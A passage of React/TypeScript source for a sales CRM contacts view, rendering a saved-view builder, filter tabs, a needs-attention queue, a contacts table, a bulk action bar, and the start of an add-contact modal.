    .slice(0, 8);
  const queue = queueSrc.map(({ c, att }) => {
    const o = ownerMeta(c.owner);
    const last = c.touches[0];
    const ch = last ? CH[last.ch] ?? NO_TOUCH : null;
    const m = statusMeta(c.status);
    const urgent = !c.owner || (c.followUp !== null && c.followUp <= 0);
    return {
      name: c.name,
      company: c.company,
      hasSource: c.loops.includes(2) && !!(c.source && c.source.trim()),
      source: (c.source || "").trim(),
      reason: att.reason,
      ownerColor: o ? o.color : "#b0b0aa",
      ownerInitial: o ? o.initial : "?",
      status: c.status,
      statusStyle: statusPill(c.status, false),
      statusDot: m.dot,
      touchChannel: ch ? ch.label : "No touch",
      touchAgo: last ? ago(last.daysAgo) : "-",
      touchIconHtml: { __html: ch ? ch.icon : "" },
      touchWrap: `width:20px;height:20px;border-radius:5px;background:${ch ? ch.bg : "#f2f2f0"};color:${ch ? ch.fg : "#a3a39d"};display:flex;align-items:center;justify-content:center;flex:0 0 auto;`,
      loops: c.loops.map((l) => loopBadge(l, true)),
      reasonColor: urgent ? "#c2410c" : "#75756f",
      border: urgent ? "#f6cfa2" : "#ededea",
      bg: urgent ? "#fffaf2" : "#ffffff",
      onClick: () => open(c.id),
    };
  });

  const rows = visible.map((c) => {
    const last = c.touches[0];
    // `?? NO_TOUCH` covers a stored `type` that isn't a known channel key.
    // Unreachable through the current write paths (both validate against
    // isValidTouchType) and there is no CHECK constraint on the column, so an
    // unguarded lookup here would white-screen the whole app for every user.
    const ch = (last ? CH[last.ch] : null) ?? NO_TOUCH;
    const conflict = hasNameConflict(c, nameIndex);
    const o = ownerMeta(c.owner);
    const m = statusMeta(c.status);
    const statusMenu = STATUSES.map((s) => ({
      label: s.id,
      dot: s.dot,
      active: s.id === c.status,
      onClick: (e: any) => setStatus(c.id, s.id, e),
      style:
        "display:flex;align-items:center;gap:8px;width:100%;padding:7px 9px;border:none;background:none;border-radius:7px;font-size:12.5px;font-family:inherit;color:#2a2a28;cursor:pointer;text-align:left;",
    }));
    return {
      id: c.id,
      name: c.name,
      company: c.company,
      selected: selectedSet.has(c.id),
      onToggleSelect: (e: any) => toggleSelect(c.id, e),
      hasConflict: conflict,
      hasLinkedin: !!linkedinUrl(c.linkedin),
      linkedinHref: linkedinUrl(c.linkedin),
      hasSource: c.loops.includes(2) && !!(c.source && c.source.trim()),
      source: (c.source || "").trim(),
      category: (c.category || "").trim(),
      // Only the figure reaches the table. The prose variant is a paragraph,
      // and a paragraph ellipsised into a table cell reads as a broken field
      // rather than as information; the detail panel shows that kind in full.
      arrFigure: isArrFigure(c.arr) ? (c.arr || "").trim() : "",
      loops: c.loops.map((l) => loopBadge(l, true)),
      touch: {
        channel: ch.label,
        ago: last ? ago(last.daysAgo) : "-",
        iconHtml: { __html: ch.icon },
        iconWrap: `width:22px;height:22px;border-radius:6px;background:${ch.bg};color:${ch.fg};display:flex;align-items:center;justify-content:center;flex:0 0 auto;`,
      },
      status: c.status,
      statusDot: m.dot,
      statusStyle: statusPill(c.status, false),
      menuOpen: S.menuId === c.id,
      toggleMenu: (e: any) => toggleMenu(c.id, e),
      stopProp: (e: any) => e.stopPropagation(),
      statusMenu,
      ownerColor: o ? o.color : "#b0b0aa",
      ownerInitial: o ? o.initial : "?",
      ownerName: c.owner || "Unassigned",
      onOpen: () => open(c.id),
      rowStyle: "border-bottom:1px solid #f2f2f0;",
    };
  });

  // The selected contact; the detail panel derives everything else itself.
  const sel = contacts.find((c) => c.id === S.selectedId) || null;
  // Empty lists for a contact with no company_id, which is what keeps the panel
  // byte-identical to what it rendered before deals existed.
  const companyCtx = sel ? companyContextFor(sel, contacts, deals) : { peers: [], deals: [] };

  // Same three-way shape as byView, and for the same reason.
  const headerTitle = activeSavedView
    ? activeSavedView.name
    : S.view === "loop1"
      ? "Loop 1 · always-on"
      : S.view === "loop2"
        ? "Loop 2 · community blitz"
        : "All contacts";
  const headerSub =
    visible.length +
    " contact" +
    (visible.length === 1 ? "" : "s") +
    (S.owner === "all" ? "" : " · " + (S.owner === "unassigned" ? "unassigned" : S.owner));

  // modal derived
  const f = S.form;
  const inputStyle =
    "width:100%;padding:9px 11px;border:1px solid #e6e6e2;border-radius:9px;font-size:13px;font-family:inherit;background:#fff;outline:none;color:#1a1a1a;";
  const loopChip = (n: number, on: boolean) => {
    const amber = n === 2;
    return on
      ? `display:flex;align-items:center;gap:7px;padding:9px 13px;border-radius:9px;border:1px solid ${amber ? "#e5a53a" : "#c9c9c3"};background:${amber ? "#fdf0d9" : "#f0f0ec"};color:${amber ? "#b45309" : "#3a3a38"};font-size:13px;font-weight:500;font-family:inherit;cursor:pointer;`
      : `display:flex;align-items:center;gap:7px;padding:9px 13px;border-radius:9px;border:1px solid #e6e6e2;background:#fff;color:#75756f;font-size:13px;font-weight:450;font-family:inherit;cursor:pointer;`;
  };
  const ownerChoice = (on: boolean) =>
    `display:flex;align-items:center;gap:7px;padding:9px 13px;border-radius:9px;border:1px solid ${on ? "#c9c9c3" : "#e6e6e2"};background:${on ? "#f0f0ec" : "#fff"};color:${on ? "#1a1a1a" : "#75756f"};font-size:13px;font-weight:${on ? "500" : "450"};font-family:inherit;cursor:pointer;`;
  const formOwners = ["Tom", "Britton", "Unassigned"].map((o) => ({
    label: o,
    style: ownerChoice(f.owner === o),
    onClick: () => setForm({ owner: o }),
    hasAvatar: o !== "Unassigned",
    color: ownerMeta(o)?.color ?? "",
    initial: ownerMeta(o)?.initial ?? "",
  }));

  return (
    <div className="slcrm" style={css("display:flex; height:100vh; width:100%; overflow:hidden; background:#ffffff;")}>
      <style dangerouslySetInnerHTML={{ __html: GLOBAL_CSS }} />

      <Sidebar nav="contacts" viewTabs={viewTabs} ownerTabs={ownerTabs} viewer={viewer} />

      {/* MAIN */}
      <main style={css("flex:1; display:flex; flex-direction:column; min-width:0; background:#ffffff;")}>
        <div style={css("display:flex; align-items:center; gap:14px; padding:16px 24px; border-bottom:1px solid #ededea;")}>
          <div style={css("min-width:0;")}>
            <div style={css("font-size:17px; font-weight:600; letter-spacing:-0.015em;")}>{headerTitle}</div>
            <div style={css("font-size:12.5px; color:#9a9a95; margin-top:1px;")}>{headerSub}</div>
          </div>
          <div style={css("flex:1;")} />
          <div style={css("position:relative; width:260px;")}>
            <IconSearch style={css("position:absolute; left:10px; top:50%; transform:translateY(-50%); color:#b0b0aa;")} />
            <Box
              as="input"
              value={S.query}
              onChange={onSearch}
              placeholder="Search name or company…"
              style={css("width:100%; padding:8px 12px 8px 32px; border:1px solid #e6e6e2; border-radius:8px; font-size:13px; font-family:inherit; background:#fbfbfa; outline:none; color:#1a1a1a;")}
              focus={css("border-color:#c9c9c3; background:#fff;")}
            />
          </div>
          {/* Secondary, not primary: "Add contact" is the one black button in this
              header, and the shell's pattern is one primary action per surface.
              The black button for this flow is "Save view", inside the card. */}
          <Box as="button" onClick={S.viewBuilder ? closeViewBuilder : openViewBuilder} style={css(`display:flex; align-items:center; gap:6px; padding:8px 12px; border:1px solid ${S.viewBuilder ? "#c9c9c3" : "#e6e6e2"}; background:${S.viewBuilder ? "#f0f0ec" : "#fff"}; border-radius:8px; font-size:13px; font-weight:500; font-family:inherit; color:#3a3a38; cursor:pointer; white-space:nowrap;`)} hover={css("background:#f4f4f1;")}>
            <IconFilter />
            New view
          </Box>
          <Box as="button" onClick={openCsv} style={css("display:flex; align-items:center; gap:6px; padding:8px 12px; border:1px solid #e6e6e2; background:#fff; border-radius:8px; font-size:13px; font-weight:500; font-family:inherit; color:#3a3a38; cursor:pointer; white-space:nowrap;")} hover={css("background:#f4f4f1;")}>
            <IconUpload />
            Import CSV
          </Box>
          {/* Secondary, and styled as the "New view" toggle rather than as a
              black button: this opens a persistent surface, and "Add contact"
              stays the one primary action on this header. The panel gets its own
              primary ("Add N to Loop 1") because it is its own surface. */}
          <Box as="button" onClick={S.prospectOpen ? closeProspect : openProspect} style={css(`display:flex; align-items:center; gap:6px; padding:8px 12px; border:1px solid ${S.prospectOpen ? "#c9c9c3" : "#e6e6e2"}; background:${S.prospectOpen ? "#f0f0ec" : "#fff"}; border-radius:8px; font-size:13px; font-weight:500; font-family:inherit; color:#3a3a38; cursor:pointer; white-space:nowrap;`)} hover={css("background:#f4f4f1;")}>
            <IconProspect />
            Prospect
          </Box>
          <Box as="button" onClick={openAdd} style={css("display:flex; align-items:center; gap:6px; padding:8px 13px; border:none; background:#1a1a1a; border-radius:8px; font-size:13px; font-weight:500; font-family:inherit; color:#fff; cursor:pointer; white-space:nowrap;")} hover={css("background:#333;")}>
            <IconPlus />
            Add contact
          </Box>
        </div>

        <div style={css("flex:1; overflow-y:auto; overflow-x:hidden;")}>
          {/* NEW VIEW BUILDER. Scrolls with the body rather than sticking: a fixed
              card would fight the SOURCE/STAGE rows for the same band, and the
              live match count wants to sit beside the rows it will replace. */}
          {S.viewBuilder && (
            <div style={css("padding:16px 24px 0;")}>
              <div style={css("border:1px solid #e6e6e2; border-radius:12px; background:#fff; box-shadow:0 1px 2px rgba(0,0,0,0.04);")}>
                <div style={css("display:flex; align-items:center; justify-content:space-between; padding:14px 16px 0;")}>
                  <div style={css("font-size:13px; font-weight:600; letter-spacing:-0.01em;")}>New view</div>
                  <Box as="button" onClick={closeViewBuilder} title="Close" style={css("border:none; background:#f2f2ef; width:24px; height:24px; border-radius:7px; cursor:pointer; display:flex; align-items:center; justify-content:center; color:#6b6b66;")} hover={css("background:#e8e8e4;")}>
                    <IconClose size={13} />
                  </Box>
                </div>

                <div style={css("display:flex; flex-direction:column; gap:8px; padding:12px 16px 14px;")}>
                  {/* Index keys, deliberately: all three controls are controlled
                      <select>s with no internal DOM state, so re-keying after a
                      middle removal costs a wasted diff and nothing else — where
                      a synthetic id on ViewCondition would have to be stripped
                      before every submit. */}
                  {S.draftConditions.map((cond, i) => (
                    <div key={i} style={css("display:flex; align-items:center; gap:8px;")}>
                      <select
                        value={cond.field}
                        onChange={(e) => setConditionField(i, e.target.value)}
                        aria-label="Field"
                        style={css(inputStyle + "flex:1; min-width:0; cursor:pointer;")}
                      >
                        {VIEW_FIELDS.map((f) => (
                          <option key={f.key} value={f.key}>{f.label}</option>
                        ))}
                      </select>
                      <select
                        value={cond.op}
                        onChange={(e) => setConditionOp(i, e.target.value as ViewOp)}
                        aria-label="Operator"
                        style={css(inputStyle + "width:96px; flex:0 0 auto; cursor:pointer;")}
                      >
                        {VIEW_OPS.map((op) => (
                          <option key={op} value={op}>{VIEW_OP_LABELS[op]}</option>
                        ))}
                      </select>
                      <select
                        value={cond.value}
                        onChange={(e) => setConditionValue(i, e.target.value)}
                        aria-label="Value"
                        style={css(inputStyle + "flex:1.4; min-width:0; cursor:pointer;")}
                      >
                        {optionsForField(cond.field).map((o) => (
                          <option key={o.value} value={o.value}>{o.label}</option>
                        ))}
                      </select>
                      {/* Always rendered, even for the last row: removing it and
                          hitting Save is how you find out a view needs a
                          condition, which beats a disabled control with no
                          explanation. */}
                      <Box as="button" onClick={() => removeCondition(i)} title="Remove condition" style={css("border:none; background:none; padding:6px; border-radius:7px; display:flex; align-items:center; justify-content:center; color:#b0b0aa; cursor:pointer; flex:0 0 auto;")} hover={css("background:#f2f2ef; color:#75756f;")}>
                        <IconClose size={14} />
                      </Box>
                    </div>
                  ))}

                  <div>
                    <Box
                      as="button"
                      onClick={addCondition}
                      disabled={S.draftConditions.length >= MAX_VIEW_CONDITIONS}
                      title={S.draftConditions.length >= MAX_VIEW_CONDITIONS ? `A view can have at most ${MAX_VIEW_CONDITIONS} conditions.` : undefined}
                      style={css(`display:inline-flex; align-items:center; gap:6px; padding:7px 11px; border:1px solid #e6e6e2; background:#fff; border-radius:9px; font-size:12.5px; font-weight:500; font-family:inherit; color:${S.draftConditions.length >= MAX_VIEW_CONDITIONS ? "#b0b0aa" : "#3a3a38"}; cursor:${S.draftConditions.length >= MAX_VIEW_CONDITIONS ? "default" : "pointer"};`)}
                      hover={css("background:#f4f4f1;")}
                    >
                      <IconPlus size={13} />
                      Add condition
                    </Box>
                  </div>
                </div>

                {/* Conditions AND together, which "+ Add condition" rather implies
                    an OR — so the count is the only honest preview available. */}
                <div style={css("display:flex; align-items:center; justify-content:space-between; gap:12px; padding:12px 16px; border-top:1px solid #ededea;")}>
                  <span style={css("font-size:12.5px; color:#9a9a95;")}>Matches</span>
                  <span style={css(MONO + "font-size:11.5px; padding:3px 9px; border-radius:7px; background:#eef0fb; color:#4457c9;")}>
                    {draftMatches} contact{draftMatches === 1 ? "" : "s"}
                  </span>
                </div>

                {S.actionError && (
                  <div style={css("padding:0 16px 10px; font-size:12px; color:#c2410c;")}>{S.actionError}</div>
                )}

                <div style={css("display:flex; align-items:center; gap:10px; padding:12px 16px; border-top:1px solid #ededea; flex-wrap:wrap;")}>
                  <Box
                    as="input"
                    value={S.viewName}
                    maxLength={LIMITS.viewName}
                    onChange={(e: any) => patch({ viewName: e.target.value })}
                    placeholder="Name this view"
                    aria-label="View name"
                    style={css(inputStyle + "flex:1; min-width:180px;")}
                    focus={css("border-color:#c9c9c3;")}
                  />
                  <label style={css("display:flex; align-items:center; gap:7px; font-size:12.5px; color:#575753; cursor:pointer; white-space:nowrap;")}>
                    <Checkbox
                      checked={S.viewShared}
                      onClick={() => patch((s) => ({ viewShared: !s.viewShared }))}
                      title={S.viewShared ? "Everyone can see this view" : "Only you can see this view"}
                    />
                    Shared
                  </label>
                  <Box
                    as="button"
                    onClick={saveView}
                    disabled={submitPending}
                    style={css(`display:flex; align-items:center; gap:6px; padding:9px 15px; border:none; background:${submitPending ? "#c9c9c3" : "#1a1a1a"}; color:#fff; border-radius:9px; font-size:13px; font-weight:500; font-family:inherit; cursor:${submitPending ? "default" : "pointer"}; white-space:nowrap;`)}
                    hover={css(submitPending ? "" : "background:#333;")}
                  >
                    <IconSave size={13} />
                    Save view
                  </Box>
                </div>
              </div>
            </div>
          )}
          {S.view === "loop2" && sourceTabs.length > 0 && (
            <div style={css("display:flex; align-items:center; gap:8px; padding:14px 24px 2px; flex-wrap:wrap;")}>
              <span style={css("font-size:11px; font-weight:500; color:#9a9a95; text-transform:uppercase; letter-spacing:0.05em; margin-right:2px;")}>Source</span>
              {sourceTabs.map((t) => (
                <Box
                  as="button"
                  key={t.key}
                  onClick={t.onClick}
                  style={css(
                    `display:inline-flex; align-items:center; gap:6px; padding:5px 11px; border-radius:8px; font-size:12.5px; font-family:inherit; cursor:pointer; white-space:nowrap; border:1px solid ${t.active ? (t.key === "all" ? "#d8d8d3" : "#f0e4cf") : "transparent"}; background:${t.active ? (t.key === "all" ? "#eeeee9" : "#faf3e6") : "none"}; color:${t.active ? (t.key === "all" ? "#1a1a1a" : "#9a6f34") : "#575753"}; font-weight:${t.active ? "500" : "450"};`,
                  )}
                  hover={css("background:#f4f4f1;")}
                >
                  {t.key !== "all" && (
                    <svg width="11" height="11" viewBox="0 0 24 24" fill="none" style={css("flex:0 0 auto; color:#c69a4f;")}>
                      <path d="M4 8a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2 2 2 0 0 0 0 4 2 2 0 0 1-2 2H6a2 2 0 0 1-2-2 2 2 0 0 0 0-4Z" stroke="currentColor" strokeWidth="1.8" strokeLinejoin="round" />
                      <path d="M12 6v12" stroke="currentColor" strokeWidth="1.8" strokeDasharray="1.5 2.5" />
                    </svg>
                  )}
                  {t.label}
                  <span style={css(MONO + "font-size:11px; color:#a3a39d;")}>{t.count}</span>
                </Box>
              ))}
            </div>
          )}
          <div style={css("display:flex; align-items:center; gap:8px; padding:14px 24px 2px; flex-wrap:wrap;")}>
            <span style={css("font-size:11px; font-weight:500; color:#9a9a95; text-transform:uppercase; letter-spacing:0.05em; margin-right:2px;")}>Stage</span>
            {stageTabs.map((t) => (
              <Box
                as="button"
                key={t.key}
                onClick={t.onClick}
                style={css(
                  `display:inline-flex; align-items:center; gap:6px; padding:5px 11px; border-radius:8px; font-size:12.5px; font-family:inherit; cursor:pointer; white-space:nowrap; border:1px solid ${t.active ? "#d8d8d3" : "transparent"}; background:${t.active ? "#eeeee9" : "none"}; color:${t.active ? "#1a1a1a" : "#575753"}; font-weight:${t.active ? "500" : "450"};`,
                )}
                hover={css("background:#f4f4f1;")}
              >
                {t.dot && <span style={css(`width:6px; height:6px; border-radius:4px; background:${t.dot};`)} />}
                {t.label}
                <span style={css(MONO + "font-size:11px; color:#a3a39d;")}>{t.count}</span>
              </Box>
            ))}
          </div>
          {queue.length > 0 && (
            <div style={css("padding:16px 24px 4px;")}>
              <div style={css("display:flex; align-items:center; gap:8px; margin-bottom:10px;")}>
                <IconWarn style={css("color:#c2410c;")} />
                <span style={css("font-size:12.5px; font-weight:600; color:#3a3a38;")}>Needs attention</span>
                <span style={css(MONO + "font-size:11px; color:#a3a39d;")}>{queue.length}</span>
              </div>
              <div style={css("display:grid; grid-template-columns:repeat(auto-fill, minmax(258px, 1fr)); gap:10px;")}>
                {queue.map((qc, i) => (
                  <Box
                    as="button"
                    key={i}
                    onClick={qc.onClick}
                    style={css(`display:flex; flex-direction:column; gap:10px; padding:13px 14px; border:1px solid ${qc.border}; background:${qc.bg}; border-radius:12px; cursor:pointer; font-family:inherit; text-align:left;`)}
                    hover={css("border-color:#d4d4ce; box-shadow:0 2px 8px rgba(0,0,0,0.05);")}
                  >
                    <span style={css("display:flex; align-items:center; gap:10px; width:100%;")}>
                      <span style={css(`width:30px; height:30px; border-radius:8px; background:${qc.ownerColor}; color:#fff; display:flex; align-items:center; justify-content:center; font-size:12px; font-weight:600; flex:0 0 auto;`)}>{qc.ownerInitial}</span>
                      <span style={css("display:flex; flex-direction:column; gap:1px; min-width:0; flex:1;")}>
                        <span style={css("font-size:13.5px; font-weight:500; color:#1a1a1a; line-height:1.25; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;")}>{qc.name}</span>
                        <span style={css("display:flex; align-items:center; gap:5px; min-width:0;")}>
                          <span style={css("font-size:11.5px; color:#9a9a95; line-height:1.25; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;")}>{qc.company}</span>
                          {qc.hasSource && <SourceTag label={qc.source} />}
                        </span>
                      </span>
                      <span style={css("display:flex; gap:3px; flex:0 0 auto;")}>
                        {qc.loops.map((lp, j) => (
                          <span key={j} style={css(lp.style)}>{lp.label}</span>
                        ))}
                      </span>
                    </span>
                    <span style={css("display:flex; align-items:center; justify-content:space-between; gap:8px; width:100%;")}>
                      <span style={css("display:flex; align-items:center; gap:6px; min-width:0;")}>
                        <span style={css(qc.touchWrap)}><span dangerouslySetInnerHTML={qc.touchIconHtml} style={css("display:flex;")} /></span>
                        <span style={css("font-size:11.5px; color:#75756f; white-space:nowrap;")}>{qc.touchChannel} · <span style={css(MONO + "color:#a3a39d;")}>{qc.touchAgo}</span></span>
                      </span>
                      <span style={css(qc.statusStyle)}><span style={css(`width:6px; height:6px; border-radius:4px; background:${qc.statusDot};`)} />{qc.status}</span>
                    </span>
                    <span style={{ ...css("display:flex; align-items:center; gap:6px; width:100%; padding-top:9px; border-top:1px solid rgba(0,0,0,0.055); font-size:12px; font-weight:500;"), color: qc.reasonColor }}>
                      <IconWarn size={13} style={css("flex:0 0 auto;")} />
                      {qc.reason}
                    </span>
                  </Box>
                ))}
              </div>
            </div>
          )}

          <div style={css("padding:16px 24px 40px;")}>
            <div style={css("display:grid; grid-template-columns:28px minmax(0,2.4fr) 88px minmax(0,1.3fr) 132px 44px 40px; gap:12px; padding:0 10px 8px; font-size:11px; font-weight:500; color:#a3a39d; text-transform:uppercase; letter-spacing:0.04em; align-items:center;")}>
              <div style={css("display:flex; align-items:center;")}>
                {visible.length > 0 && (
                  <Checkbox
                    checked={allVisibleSelected}
                    indeterminate={!allVisibleSelected && someVisibleSelected}
                    onClick={toggleSelectAll}
                    title={allVisibleSelected ? "Clear selection" : "Select all"}
                  />
                )}
              </div>
              <div>Contact</div>
              <div>Loops</div>
              <div>Last touch</div>
              <div>Status</div>
              <div style={css("text-align:center;")}>Owner</div>
              <div />
            </div>

            <div style={css("border:1px solid #ededea; border-radius:11px; overflow:hidden; background:#fff;")}>
              {rows.map((row) => (
                <div key={row.id} style={css(row.rowStyle)}>
                  <Box onClick={row.onOpen} style={css(`display:grid; grid-template-columns:28px minmax(0,2.4fr) 88px minmax(0,1.3fr) 132px 44px 40px; gap:12px; align-items:center; padding:11px 10px; cursor:pointer; background:${row.selected ? "#f6f7fb" : "transparent"};`)} hover={css("background:#fafaf9;")}>
                    <div style={css("display:flex; align-items:center;")} onClick={row.stopProp}>
                      <Checkbox checked={row.selected} onClick={row.onToggleSelect} title="Select contact" />
                    </div>
                    <div style={css("display:flex; align-items:center; gap:10px; min-width:0;")}>
                      {row.hasConflict && (
                        <span title="Both teammates involved" style={css("flex:0 0 auto; width:6px; height:6px; border-radius:4px; background:#dc2626;")} />
                      )}
                      <div style={css("min-width:0;")}>
                        <div style={css("display:flex; align-items:center; gap:6px; min-width:0;")}>
                          <span style={css("font-size:13.5px; font-weight:500; color:#1a1a1a; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; line-height:1.25;")}>{row.name}</span>
                          {row.hasLinkedin && <LinkedinButton href={row.linkedinHref} stopProp={row.stopProp} />}
                        </div>
                        <div style={css("display:flex; align-items:center; gap:6px; min-width:0;")}>
                          <span style={css("font-size:12px; color:#9a9a95; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; line-height:1.25;")}>{row.company}</span>
                          {row.hasSource && <SourceTag label={row.source} />}
                          {row.category && <CategoryTag label={row.category} />}
                          {row.arrFigure && <ArrLabel value={row.arrFigure} />}
                        </div>
                      </div>
                    </div>
                    <div style={css("display:flex; gap:4px;")}>
                      {row.loops.map((lp, j) => (
                        <span key={j} title={lp.title} style={css(lp.style)}>{lp.label}</span>
                      ))}
                    </div>
                    <div style={css("display:flex; align-items:center; gap:7px; min-width:0;")}>
                      <span style={css(row.touch.iconWrap)}>
                        <span dangerouslySetInnerHTML={row.touch.iconHtml} style={css("display:flex;")} />
                      </span>
                      <span style={css("display:flex; flex-direction:column; min-width:0;")}>
                        <span style={css("font-size:12.5px; color:#3a3a38; line-height:1.2; white-space:nowrap;")}>{row.touch.channel}</span>
                        <span style={css("font-size:11px; color:#a3a39d; line-height:1.2;" + MONO)}>{row.touch.ago}</span>
                      </span>
                    </div>
                    <div style={css("position:relative;")} onClick={row.stopProp}>
                      <Box as="button" onClick={row.toggleMenu} style={css(row.statusStyle)} hover={css("filter:brightness(0.97);")}>
                        <span style={css(`width:6px; height:6px; border-radius:4px; background:${row.statusDot};`)} />
                        {row.status}
                        <IconChevronDown style={css("margin-left:1px; opacity:0.5;")} />
                      </Box>
                      {row.menuOpen && (
                        <div style={css("position:absolute; top:calc(100% + 4px); left:0; z-index:40; background:#fff; border:1px solid #e6e6e2; border-radius:10px; box-shadow:0 8px 28px rgba(0,0,0,0.12); padding:4px; min-width:150px; animation:slcrm-fadeIn 0.1s ease;")}>
                          {row.statusMenu.map((opt, j) => (
                            <Box as="button" key={j} onClick={opt.onClick} style={css(opt.style)} hover={css("background:#f4f4f1;")}>
                              <span style={css(`width:6px; height:6px; border-radius:4px; background:${opt.dot};`)} />
                              {opt.label}
                              {opt.active && <IconCheck style={css("margin-left:auto; color:#3a3a38;")} />}
                            </Box>
                          ))}
                        </div>
                      )}
                    </div>
                    <div style={css("display:flex; justify-content:center;")}>
                      <span title={row.ownerName} style={css(`width:24px; height:24px; border-radius:7px; background:${row.ownerColor}; color:#fff; display:flex; align-items:center; justify-content:center; font-size:11px; font-weight:600;`)}>{row.ownerInitial}</span>
                    </div>
                    <div style={css("display:flex; justify-content:center; color:#c4c4be;")}>
                      <IconChevronRight />
                    </div>
                  </Box>
                </div>
              ))}
            </div>
            {visible.length === 0 && (
              <div style={css("text-align:center; padding:48px; color:#a3a39d; font-size:13px;")}>No contacts match this view.</div>
            )}
          </div>
        </div>
      </main>

      {/* BULK ACTION BAR */}
      {selectedCount > 0 && (
        <div style={css("position:fixed; left:50%; bottom:24px; transform:translateX(-50%); z-index:45; display:flex; align-items:center; gap:8px; padding:8px 8px 8px 16px; background:#1a1a1a; border-radius:12px; box-shadow:0 12px 32px rgba(0,0,0,0.28); animation:slcrm-slideDown 0.16s ease;")}>
          <span style={css("font-size:13px; font-weight:500; color:#fff; white-space:nowrap;")}>{selectedCount} selected</span>
          <span style={css("width:1px; height:20px; background:rgba(255,255,255,0.16); margin:0 2px;")} />
          <Box
            as="button"
            onClick={exportEmails}
            disabled={selectedEmails.length === 0}
            title={selectedEmails.length === 0 ? "None of the selected contacts have an email" : `Export ${selectedEmails.length} email${selectedEmails.length === 1 ? "" : "s"} as CSV`}
            style={css(`display:flex; align-items:center; gap:7px; padding:7px 12px; border:none; border-radius:8px; font-size:12.5px; font-weight:500; font-family:inherit; background:rgba(255,255,255,0.12); color:#fff; cursor:${selectedEmails.length === 0 ? "default" : "pointer"}; opacity:${selectedEmails.length === 0 ? "0.45" : "1"}; white-space:nowrap;`)}
            hover={css(selectedEmails.length === 0 ? "" : "background:rgba(255,255,255,0.2);")}
          >
            <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M12 4v10m0 0-4-4m4 4 4-4" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" /><path d="M5 18v1a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-1" stroke="currentColor" strokeWidth="2" strokeLinecap="round" /></svg>
            Export emails
          </Box>
          <Box
            as="button"
            onClick={markAdsSent}
            title="Log a Dark-ad touchpoint (today) for every selected contact"
            style={css("display:flex; align-items:center; gap:7px; padding:7px 13px; border:none; border-radius:8px; font-size:12.5px; font-weight:500; font-family:inherit; background:#6d3fc4; color:#fff; cursor:pointer; white-space:nowrap;")}
            hover={css("background:#7d4ed6;")}
          >
            <span style={css("display:flex; color:#fff;")} dangerouslySetInnerHTML={{ __html: CH.ad.icon }} />
            Mark ads sent
          </Box>
          <Box
            as="button"
            onClick={deleteSelected}
            title={`Delete ${selectedCount} contact${selectedCount === 1 ? "" : "s"}`}
            style={css("display:flex; align-items:center; gap:7px; padding:7px 12px; border:none; border-radius:8px; font-size:12.5px; font-weight:500; font-family:inherit; background:rgba(220,38,38,0.18); color:#fca5a5; cursor:pointer; white-space:nowrap;")}
            hover={css("background:#dc2626; color:#fff;")}
          >
            <IconTrash />
            Delete
          </Box>
          <Box
            as="button"
            onClick={clearSelection}
            title="Clear selection"
            style={css("display:flex; align-items:center; justify-content:center; width:30px; height:30px; border:none; border-radius:8px; background:rgba(255,255,255,0.08); color:#cfcfcf; cursor:pointer; flex:0 0 auto;")}
            hover={css("background:rgba(255,255,255,0.16);")}
          >
            <IconClose size={15} />
          </Box>
        </div>
      )}

      {/* PROSPECTING SLIDE-OVER */}
      {S.prospectOpen && (
        <ProspectingPanel
          turns={turns}
          draft={S.prospectDraft}
          selected={S.prospectSelected}
          loop={S.prospectLoop}
          owner={S.prospectOwner}
          source={S.prospectSource}
          error={S.prospectError}
          pending={prospectPending}
          sending={prospectSending}
          configured={prospectConfigured}
          onDraft={(prospectDraft) => patch({ prospectDraft })}
          onSend={sendProspect}
          onToggle={toggleProspect}
          onToggleAll={toggleAllProspects}
          onLoop={(prospectLoop) => patch({ prospectLoop })}
          onOwner={(prospectOwner) => patch({ prospectOwner })}
          onSource={(prospectSource) => patch({ prospectSource })}
          onPromote={promoteProspects}
          onCancel={cancelProspect}
          onExport={exportProspects}
          onClose={closeProspect}
        />
      )}

      {/* DETAIL SLIDE-OVER */}
      {sel && (
        <ContactDetail
          key={sel.id}
          contact={sel}
          viewer={viewer}
          nameIndex={nameIndex}
          noteDraft={S.noteDraft}
          statusMenuOpen={S.detailMenu}
          pending={fetcher.state !== "idle"}
          onClose={close}
          onToggleStatusMenu={toggleDetailMenu}
          onSetStatus={setStatus}
          onNoteInput={onNoteInput}
          onNoteKey={onNoteKey}
          onAddNote={addNote}
          onLogMeeting={logMeeting}
          onLogTouch={logTouch}
          onSnoozeFollow={snoozeFollow}
          onClearFollow={clearFollow}
          onResumeLoop1={resumeLoop1}
          onDraftOutreach={draftOutreach}
          onDelete={askDelete}
          companyPeers={companyCtx.peers}
          companyDeals={companyCtx.deals}
          onOpenContact={open}
        />
      )}

      {/* ADD / IMPORT MODAL */}
      {S.modal && (
        <div onClick={closeModal} style={css("position:fixed; inset:0; background:rgba(20,20,18,0.22); z-index:60; display:flex; align-items:flex-start; justify-content:center; padding:72px 20px; animation:slcrm-fadeIn 0.14s ease;")}>
          <div onClick={(e) => e.stopPropagation()} style={css("width:520px; max-width:100%; background:#fff; border-radius:16px; box-shadow:0 20px 60px rgba(0,0,0,0.22); overflow:hidden; animation:slcrm-slideDown 0.18s cubic-bezier(0.2,0.8,0.2,1);")}>
            {S.modal === "add" && (
              <>
                <div style={css("padding:20px 22px 16px; border-bottom:1px solid #ededea; display:flex; align-items:center; justify-content:space-between;")}>
                  <div style={css("font-size:16px; font-weight:600; letter-spacing:-0.01em;")}>Add contact</div>
                  <Box as="button" onClick={closeModal} style={css("border:none; background:#f2f2ef; width:28px; height:28px; border-radius:8px; cursor:pointer; display:flex; align-items:center; justify-content:center; color:#6b6b66;")} hover={css("background:#e8e8e4;")}><IconClose size={15} /></Box>
                </div>
                <div style={css("padding:18px 22px 22px; display:flex; flex-direction:column; gap:16px;")}>
                  <div style={css("display:grid; grid-template-columns:1fr 1fr; gap:12px;")}>
                    <label style={css("display:flex; flex-direction:column; gap:6px;")}>
                      <span style={css("font-size:12px; font-weight:500; color:#575753;")}>Name</span>
                      <Box as="input" value={f.name} maxLength={LIMITS.name} onChange={(e: any) => setForm({ name: e.target.value })} placeholder="Full name" style={css(inputStyle)} focus={css("border-color:#c9c9c3;")} />
                    </label>
